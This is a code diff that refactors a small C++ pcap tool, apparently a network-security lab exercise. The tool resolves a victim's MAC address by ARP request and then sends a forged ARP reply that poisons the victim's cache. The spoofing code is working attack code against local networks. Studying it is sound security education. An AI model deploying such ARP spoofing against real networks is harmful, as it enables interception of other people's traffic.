@@ -27,7 +27,7 @@ void usage() {
     printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-bool getMyInfo(const char* dev, Mac& my_mac, Ip& my_ip) {
+bool getMyAddr(const char* dev, Mac& my_mac, Ip& my_ip) {
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
         perror("socket");
@@ -92,6 +92,44 @@ EthArpPacket sendArp(pcap_t* handle, int op, Mac eth_dmac, Mac eth_smac, Mac arp
 	return packet;
 }	
 
+Mac getSenderMac(pcap_t* handle, Mac my_mac, Ip my_ip, Ip sender_ip)
+{
+	Mac sender_mac;
+	while(true)
+	{
+		// Send normal arp packet to get sender mac addr
+		struct EthArpPacket sendPacket = sendArp(handle, 1, Mac::broadcastMac(), my_mac, my_mac, Mac::nullMac(), my_ip, sender_ip);
+
+		// receive reply packet and parse...
+		struct pcap_pkthdr* header;
+		const u_char* packet_data;
+		int res = pcap_next_ex(handle, &header, &packet_data);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+		{
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
+			break;
+		}
+		
+		if (header->caplen < sizeof(EthArpPacket))
+			continue;
+
+		struct EthArpPacket* resPacket = (struct EthArpPacket *)(packet_data);
+		struct EthArpPacket* reqPacket = &sendPacket;
+
+		// get sender mac
+		if((reqPacket->eth_.smac_ == resPacket->eth_.dmac_) && (reqPacket->arp_.tip_ == resPacket->arp_.sip_))
+		{
+			sender_mac = resPacket->eth_.smac_;
+			printf("sender mac: %s\n", std::string(sender_mac).c_str());
+			break;
+		}
+		else
+			continue;
+	}
+	return sender_mac;
+}
+
 int main(int argc, char* argv[])
 {
     // Checking the arguments
@@ -104,7 +142,7 @@ int main(int argc, char* argv[])
     // Get Host Information
     Mac my_mac;
     Ip my_ip;
-    if (getMyInfo(argv[1], my_mac, my_ip)) {
+    if (getMyAddr(argv[1], my_mac, my_ip)) {
 		printf("[Host Info]\n");
         printf("interface: %s\n", argv[1]);
         printf("my MAC: %s\n", std::string(my_mac).c_str());
@@ -134,43 +172,13 @@ int main(int argc, char* argv[])
 		printf("sender ip: %s\n", std::string(sender_ip).c_str());
         printf("target ip: %s\n", std::string(target_ip).c_str());
 
-		while(true)
-		{
-			// Send normal arp packet to get sender mac addr
-			struct EthArpPacket sendPacket = sendArp(handle, 1, Mac::broadcastMac(), my_mac, my_mac, Mac::nullMac(), my_ip, sender_ip);
-
-			// receive reply packet and parse...
-			struct pcap_pkthdr* header;
-			const u_char* packet_data;
-			int res = pcap_next_ex(handle, &header, &packet_data);
-			if (res == 0) continue;
-			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
-			{
-				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
-				break;
-			}
-			
-			if (header->caplen < sizeof(EthArpPacket))
-				continue;
-
-			struct EthArpPacket* resPacket = (struct EthArpPacket *)(packet_data);
-			struct EthArpPacket* reqPacket = &sendPacket;
-
-			// get sender mac
-			if((reqPacket->eth_.smac_ == resPacket->eth_.dmac_) && (reqPacket->arp_.tip_ == resPacket->arp_.sip_))
-			{
-				sender_mac = resPacket->eth_.smac_;
-				printf("sender mac: %s\n", std::string(sender_mac).c_str());
-				break;
-			}
-			else
-				continue;
-		}
+		sender_mac = getSenderMac(handle, my_mac, my_ip, sender_ip);
 		
 		// Send arp spoofing to target
 		printf("======================\n");
 		printf("[Sending Spoof Packet]\n");
 		sendArp(handle, 2, sender_mac, my_mac, my_mac, sender_mac, target_ip, sender_ip);
+		printf("done\n");
 	}
 	pcap_close(handle);
     return 0;
